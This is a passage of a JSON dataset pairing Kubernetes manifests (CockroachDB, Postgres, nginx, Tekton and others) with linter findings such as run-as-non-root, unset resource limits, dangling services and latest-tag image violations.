    "violation_text": "serviceAccount \"cockroachdb\" not found"
  },
  {
    "id": "11743",
    "manifest_path": "data/manifests/the_stack_sample/sample_4531.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: cluster-init-secure\n  labels:\n    app: cockroachdb\nspec:\n  template:\n    spec:\n      serviceAccountName: cockroachdb\n      initContainers:\n      - name: init-certs\n        image: cockroachdb/cockroach-k8s-request-cert:0.4\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/ash\n        - -ecx\n        - /request-cert -namespace=${POD_NAMESPACE} -certs-dir=/cockroach-certs -type=client\n          -user=root -symlink-ca-from=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt\n        env:\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: client-certs\n          mountPath: /cockroach-certs\n      containers:\n      - name: cluster-init\n        image: cockroachdb/cockroach:v20.1.3\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: client-certs\n          mountPath: /cockroach-certs\n        command:\n        - /cockroach/cockroach\n        - init\n        - --certs-dir=/cockroach-certs\n        - --host=cockroachdb-0.cockroachdb\n      volumes:\n      - name: client-certs\n        emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"cluster-init\" is not set to runAsNonRoot"
  },
  {
    "id": "11744",
    "manifest_path": "data/manifests/the_stack_sample/sample_4531.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: cluster-init-secure\n  labels:\n    app: cockroachdb\nspec:\n  template:\n    spec:\n      serviceAccountName: cockroachdb\n      initContainers:\n      - name: init-certs\n        image: cockroachdb/cockroach-k8s-request-cert:0.4\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/ash\n        - -ecx\n        - /request-cert -namespace=${POD_NAMESPACE} -certs-dir=/cockroach-certs -type=client\n          -user=root -symlink-ca-from=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt\n        env:\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: client-certs\n          mountPath: /cockroach-certs\n      containers:\n      - name: cluster-init\n        image: cockroachdb/cockroach:v20.1.3\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: client-certs\n          mountPath: /cockroach-certs\n        command:\n        - /cockroach/cockroach\n        - init\n        - --certs-dir=/cockroach-certs\n        - --host=cockroachdb-0.cockroachdb\n      volumes:\n      - name: client-certs\n        emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"init-certs\" is not set to runAsNonRoot"
  },
  {
    "id": "11745",
    "manifest_path": "data/manifests/the_stack_sample/sample_4531.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: cluster-init-secure\n  labels:\n    app: cockroachdb\nspec:\n  template:\n    spec:\n      serviceAccountName: cockroachdb\n      initContainers:\n      - name: init-certs\n        image: cockroachdb/cockroach-k8s-request-cert:0.4\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/ash\n        - -ecx\n        - /request-cert -namespace=${POD_NAMESPACE} -certs-dir=/cockroach-certs -type=client\n          -user=root -symlink-ca-from=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt\n        env:\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: client-certs\n          mountPath: /cockroach-certs\n      containers:\n      - name: cluster-init\n        image: cockroachdb/cockroach:v20.1.3\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: client-certs\n          mountPath: /cockroach-certs\n        command:\n        - /cockroach/cockroach\n        - init\n        - --certs-dir=/cockroach-certs\n        - --host=cockroachdb-0.cockroachdb\n      volumes:\n      - name: client-certs\n        emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"cluster-init\" has cpu request 0"
  },
  {
    "id": "11746",
    "manifest_path": "data/manifests/the_stack_sample/sample_4531.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: cluster-init-secure\n  labels:\n    app: cockroachdb\nspec:\n  template:\n    spec:\n      serviceAccountName: cockroachdb\n      initContainers:\n      - name: init-certs\n        image: cockroachdb/cockroach-k8s-request-cert:0.4\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/ash\n        - -ecx\n        - /request-cert -namespace=${POD_NAMESPACE} -certs-dir=/cockroach-certs -type=client\n          -user=root -symlink-ca-from=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt\n        env:\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: client-certs\n          mountPath: /cockroach-certs\n      containers:\n      - name: cluster-init\n        image: cockroachdb/cockroach:v20.1.3\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: client-certs\n          mountPath: /cockroach-certs\n        command:\n        - /cockroach/cockroach\n        - init\n        - --certs-dir=/cockroach-certs\n        - --host=cockroachdb-0.cockroachdb\n      volumes:\n      - name: client-certs\n        emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"init-certs\" has cpu request 0"
  },
  {
    "id": "11747",
    "manifest_path": "data/manifests/the_stack_sample/sample_4531.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: cluster-init-secure\n  labels:\n    app: cockroachdb\nspec:\n  template:\n    spec:\n      serviceAccountName: cockroachdb\n      initContainers:\n      - name: init-certs\n        image: cockroachdb/cockroach-k8s-request-cert:0.4\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/ash\n        - -ecx\n        - /request-cert -namespace=${POD_NAMESPACE} -certs-dir=/cockroach-certs -type=client\n          -user=root -symlink-ca-from=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt\n        env:\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: client-certs\n          mountPath: /cockroach-certs\n      containers:\n      - name: cluster-init\n        image: cockroachdb/cockroach:v20.1.3\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: client-certs\n          mountPath: /cockroach-certs\n        command:\n        - /cockroach/cockroach\n        - init\n        - --certs-dir=/cockroach-certs\n        - --host=cockroachdb-0.cockroachdb\n      volumes:\n      - name: client-certs\n        emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"cluster-init\" has memory limit 0"
  },
  {
    "id": "11748",
    "manifest_path": "data/manifests/the_stack_sample/sample_4531.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: cluster-init-secure\n  labels:\n    app: cockroachdb\nspec:\n  template:\n    spec:\n      serviceAccountName: cockroachdb\n      initContainers:\n      - name: init-certs\n        image: cockroachdb/cockroach-k8s-request-cert:0.4\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/ash\n        - -ecx\n        - /request-cert -namespace=${POD_NAMESPACE} -certs-dir=/cockroach-certs -type=client\n          -user=root -symlink-ca-from=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt\n        env:\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: client-certs\n          mountPath: /cockroach-certs\n      containers:\n      - name: cluster-init\n        image: cockroachdb/cockroach:v20.1.3\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: client-certs\n          mountPath: /cockroach-certs\n        command:\n        - /cockroach/cockroach\n        - init\n        - --certs-dir=/cockroach-certs\n        - --host=cockroachdb-0.cockroachdb\n      volumes:\n      - name: client-certs\n        emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"init-certs\" has memory limit 0"
  },
  {
    "id": "11749",
    "manifest_path": "data/manifests/the_stack_sample/sample_4535.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: postgres\nspec:\n  selector:\n    matchLabels:\n      app: postgres\n  template:\n    metadata:\n      labels:\n        app: postgres\n    spec:\n      containers:\n      - name: postgres\n        image: postgres:11.5\n        imagePullPolicy: Never\n        ports:\n        - containerPort: 5432\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"postgres\" does not have a read-only root file system"
  },
  {
    "id": "11750",
    "manifest_path": "data/manifests/the_stack_sample/sample_4535.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: postgres\nspec:\n  selector:\n    matchLabels:\n      app: postgres\n  template:\n    metadata:\n      labels:\n        app: postgres\n    spec:\n      containers:\n      - name: postgres\n        image: postgres:11.5\n        imagePullPolicy: Never\n        ports:\n        - containerPort: 5432\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"postgres\" is not set to runAsNonRoot"
  },
  {
    "id": "11751",
    "manifest_path": "data/manifests/the_stack_sample/sample_4535.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: postgres\nspec:\n  selector:\n    matchLabels:\n      app: postgres\n  template:\n    metadata:\n      labels:\n        app: postgres\n    spec:\n      containers:\n      - name: postgres\n        image: postgres:11.5\n        imagePullPolicy: Never\n        ports:\n        - containerPort: 5432\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"postgres\" has cpu request 0"
  },
  {
    "id": "11752",
    "manifest_path": "data/manifests/the_stack_sample/sample_4535.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: postgres\nspec:\n  selector:\n    matchLabels:\n      app: postgres\n  template:\n    metadata:\n      labels:\n        app: postgres\n    spec:\n      containers:\n      - name: postgres\n        image: postgres:11.5\n        imagePullPolicy: Never\n        ports:\n        - containerPort: 5432\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"postgres\" has memory limit 0"
  },
  {
    "id": "11753",
    "manifest_path": "data/manifests/the_stack_sample/sample_4536.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: cyborg-seeker-finals-kprca00091-pov0\n  labels:\n    type: cyborg-seeker\nspec:\n  volumes:\n  - name: cyborg-results\n    persistentVolumeClaim:\n      claimName: cyborg-results\n  containers:\n  - name: cyborg-seeker-finals-kprca00091-pov0\n    image: zardus/research:cyborg-generator\n    command:\n    - /bin/bash\n    - -c\n    - python /home/angr/cyborg-generator/kubernetes_seeker.py finals KPRCA_00091 pov_0\n      3600\n    imagePullPolicy: Always\n    volumeMounts:\n    - name: cyborg-results\n      mountPath: /results\n    resources:\n      limits:\n        cpu: 1\n        memory: 10Gi\n      requests:\n        cpu: 1\n        memory: 10Gi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"cyborg-seeker-finals-kprca00091-pov0\" does not have a read-only root file system"
  },
  {
    "id": "11754",
    "manifest_path": "data/manifests/the_stack_sample/sample_4536.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: cyborg-seeker-finals-kprca00091-pov0\n  labels:\n    type: cyborg-seeker\nspec:\n  volumes:\n  - name: cyborg-results\n    persistentVolumeClaim:\n      claimName: cyborg-results\n  containers:\n  - name: cyborg-seeker-finals-kprca00091-pov0\n    image: zardus/research:cyborg-generator\n    command:\n    - /bin/bash\n    - -c\n    - python /home/angr/cyborg-generator/kubernetes_seeker.py finals KPRCA_00091 pov_0\n      3600\n    imagePullPolicy: Always\n    volumeMounts:\n    - name: cyborg-results\n      mountPath: /results\n    resources:\n      limits:\n        cpu: 1\n        memory: 10Gi\n      requests:\n        cpu: 1\n        memory: 10Gi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"cyborg-seeker-finals-kprca00091-pov0\" is not set to runAsNonRoot"
  },
  {
    "id": "11755",
    "manifest_path": "data/manifests/the_stack_sample/sample_4538.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: meanjsapp-service\nspec:\n  ports:\n  - port: 80\n    targetPort: meanjsapp-port\n    protocol: TCP\n  selector:\n    app: meanjsapp\n  type: LoadBalancer\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:meanjsapp])"
  },
  {
    "id": "11756",
    "manifest_path": "data/manifests/the_stack_sample/sample_4541.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-305\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "11757",
    "manifest_path": "data/manifests/the_stack_sample/sample_4541.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-305\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "11758",
    "manifest_path": "data/manifests/the_stack_sample/sample_4541.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-305\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "11759",
    "manifest_path": "data/manifests/the_stack_sample/sample_4541.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-305\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "11760",
    "manifest_path": "data/manifests/the_stack_sample/sample_4541.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-305\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "11761",
    "manifest_path": "data/manifests/the_stack_sample/sample_4543.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: component-python-test-nose\nspec:\n  containers:\n  - name: nose\n    image: hub.opshub.sh/containerops/nose:latest\n    env:\n    - name: CO_DATA\n      value: git-url=https://github.com/nose-devs/nose.git entry-path=unit_tests\n    resources:\n      requests:\n        cpu: 4\n        memory: 8G\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nose\" is using an invalid container image, \"hub.opshub.sh/containerops/nose:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "11762",
    "manifest_path": "data/manifests/the_stack_sample/sample_4543.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: component-python-test-nose\nspec:\n  containers:\n  - name: nose\n    image: hub.opshub.sh/containerops/nose:latest\n    env:\n    - name: CO_DATA\n      value: git-url=https://github.com/nose-devs/nose.git entry-path=unit_tests\n    resources:\n      requests:\n        cpu: 4\n        memory: 8G\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nose\" does not have a read-only root file system"
  },
  {
    "id": "11763",
    "manifest_path": "data/manifests/the_stack_sample/sample_4543.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: component-python-test-nose\nspec:\n  containers:\n  - name: nose\n    image: hub.opshub.sh/containerops/nose:latest\n    env:\n    - name: CO_DATA\n      value: git-url=https://github.com/nose-devs/nose.git entry-path=unit_tests\n    resources:\n      requests:\n        cpu: 4\n        memory: 8G\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nose\" is not set to runAsNonRoot"
  },
  {
    "id": "11764",
    "manifest_path": "data/manifests/the_stack_sample/sample_4543.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: component-python-test-nose\nspec:\n  containers:\n  - name: nose\n    image: hub.opshub.sh/containerops/nose:latest\n    env:\n    - name: CO_DATA\n      value: git-url=https://github.com/nose-devs/nose.git entry-path=unit_tests\n    resources:\n      requests:\n        cpu: 4\n        memory: 8G\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nose\" has memory limit 0"
  },
  {
    "id": "11765",
    "manifest_path": "data/manifests/the_stack_sample/sample_4548.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: cart\nspec:\n  ports:\n  - name: http\n    port: 8080\n    targetPort: 8080\n  selector:\n    service: cart\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[service:cart])"
  },
  {
    "id": "11766",
    "manifest_path": "data/manifests/the_stack_sample/sample_4551.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    helm.sh/chart: ingress-nginx-3.35.0\n    app.kubernetes.io/name: ingress-nginx\n    app.kubernetes.io/instance: my-ing\n    app.kubernetes.io/version: 0.48.1\n    app.kubernetes.io/managed-by: Helm\n    app.kubernetes.io/component: controller\n  name: my-ing-ingress-nginx-controller-metrics\n  namespace: ingress\nspec:\n  type: ClusterIP\n  ports:\n  - name: metrics\n    port: 10254\n    targetPort: metrics\n  selector:\n    app.kubernetes.io/name: ingress-nginx\n    app.kubernetes.io/instance: my-ing\n    app.kubernetes.io/component: controller\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app.kubernetes.io/component:controller app.kubernetes.io/instance:my-ing app.kubernetes.io/name:ingress-nginx])"
  },
  {
    "id": "11767",
    "manifest_path": "data/manifests/the_stack_sample/sample_4553.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: tekton-operator\n  labels:\n    version: devel\n    operator.tekton.dev/release: devel\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: tekton-operator\n  template:\n    metadata:\n      labels:\n        name: tekton-operator\n        app: tekton-operator\n    spec:\n      serviceAccountName: tekton-operator\n      containers:\n      - name: tekton-operator\n        image: ko://github.com/tektoncd/operator/cmd/kubernetes\n        imagePullPolicy: Always\n        env:\n        - name: SYSTEM_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: tekton-operator\n        - name: IMAGE_PIPELINES_PROXY\n          value: ko://github.com/tektoncd/operator/cmd/proxy\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"tekton-operator\" is using an invalid container image, \"ko://github.com/tektoncd/operator/cmd/kubernetes\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  }
]